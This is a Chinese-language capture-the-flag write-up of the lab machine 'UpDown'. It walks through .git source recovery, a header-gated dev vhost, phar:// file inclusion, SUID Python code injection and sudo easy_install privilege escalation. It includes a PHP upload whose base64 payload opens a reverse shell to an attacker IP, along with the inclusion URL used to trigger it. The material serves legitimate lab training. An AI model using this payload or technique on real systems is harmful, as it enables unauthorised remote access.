# UpDown

UpDown 是一台中等难度的 Linux 机器，暴露了 SSH 和 Apache 服务器。在Apache服务器上，有一个Web应用程序，允许用户检查网页是否已启动。服务器上标识了一个名为“.git”的目录，可以下载以显示目标上运行的“dev”子域的源代码，该子域只能通过特殊的“HTTP”标头访问。此外，子域允许上传文件，导致使用“phar://”PHP 包装器远程执行代码。Pivot 包括将代码注入“SUID”“Python”脚本，并以“开发人员”用户身份获取 shell，该用户无需密码即可使用“Sudo”运行“easy_install”。这可以通过创建恶意 python 脚本并在其上运行“easy_install”来利用，因为提升的权限不会被丢弃，从而允许我们以“root”身份保持访问权限。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/cf011ed5-e81b-62d1-fe26-7e817d921e1d.png)

### Web枚举

80

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/e544fb3b-f2fd-26e1-e6c3-94a0004efd63.png)

看到这个，我下意识的去扫了一下vhost，我觉得可能会打SSRF

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/85731861-15da-786c-2e09-460d435e230e.png)

经典403

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/cc3661e6-f776-6dfa-5d46-2358022ed725.png)

在主站，开了debug之后会返回响应

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/07c3f7ea-36a9-d736-a1a8-a4624f6c135b.png)

并且输入还有过滤

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/61f099d4-6561-9ac9-ebdf-b6e090c05476.png)

对主站目录扫描发现了/dev

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/56c9d75d-4bb2-6201-40e0-7221300f0025.png)

对/dev再扫能发现.git

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/96a46194-6d33-b3fe-117d-16a92e553e60.png)

直接跑githacker

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/578fb0b8-6b6b-833f-6c99-fbfb5d8d01ee.png)

这是dev子域的源码

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/ca7e1187-996f-95b0-5018-5636a0957c59.png)

.htaccess，只允许设置了Special-Dev请求头的访问

```xaml
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

设置请求头后访问dev子域

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/86fdd327-f8c8-959c-1a22-c07fe3f18738.png)

在burp中设置请求头

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/adae02d9-ca2b-0700-12ac-13f61825d983.png)

浏览器访问dev子域

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/661bb588-327f-448a-b24d-965323e95347.png)

## Foothold

回去看源码，先看index.php

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>
```

这我咋一看，可以尝试之前的iconv包装器

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/d6f65b69-92fa-a854-60e3-0dd26ff9adae.png)

打成功了，只是有disable functions，连mail和error_log也禁了，thm祖传打法打不了

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/35a0583c-2674-c084-d96b-8015c475c58a.png)

把phpinfo保存到文件

```bash
┌──(ming👻m1n9k1n9-parrot)-[~/linux-tools_and_exp/dfunc-bypasser]
└─$ python3 ./dfunc-bypasser.py --file ../../pi.html           1 ⨯
...
...
Please add the following functions in your disable_functions option: 
proc_open
If PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socket
```

proc_open可用

iconv生成的code太长了，会414

在上传文件的时候，上传zip它会报错，导致最终没有删除掉文件，再利用index.php的文件包含，phar伪协议来利用它

cmd.php

```php
<?php proc_open(base64_decode('L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE4Lzg4ODggMD4mMSIK'),array(),$something);?>
```

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/a64ef104-8964-926e-334b-83be1b7720ca.png)

上传之后通过phar访问

	?page=phar://uploads/95f5ffb7f5709c9a5c9eae5faf0795d5/shell.txt/shell

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/c838226e-e2c3-f7a8-1742-28c99a5f6fb8.png)

## 本地横向移动

在developer家目录发现www-data组可读的dev/

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/fe1f93e1-0f29-e21e-f775-fd45393b2a5f.png)

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/9e46fa24-7df6-ddff-d8a2-d226e4632a03.png)

.py

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/ede4d731-02da-89ab-72e7-a780a663120c.png)

这是python2的代码，在老python2中，input并不像python3一样会将任何输入转换为str，所以也就导致了它可以code注入

加上已经打包好的二进制文件是具有developer的suid的，所以直接bash

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/d0e1de79-5cce-93bf-94b1-51b518701381.png)

## 本地权限提升

sudo -l

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/eb001fea-0759-7f68-986b-3cf45fc4e034.png)

strings发现是个python

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/86134d53-9261-5eff-a5a8-e5d28aeda50f.png)

垃圾桶

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/65285bb3-c3fd-1ad3-9355-38107dccd854.png)

无脑提权

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/4a652843-885e-284d-89dc-bb1b4b4403e8.png)

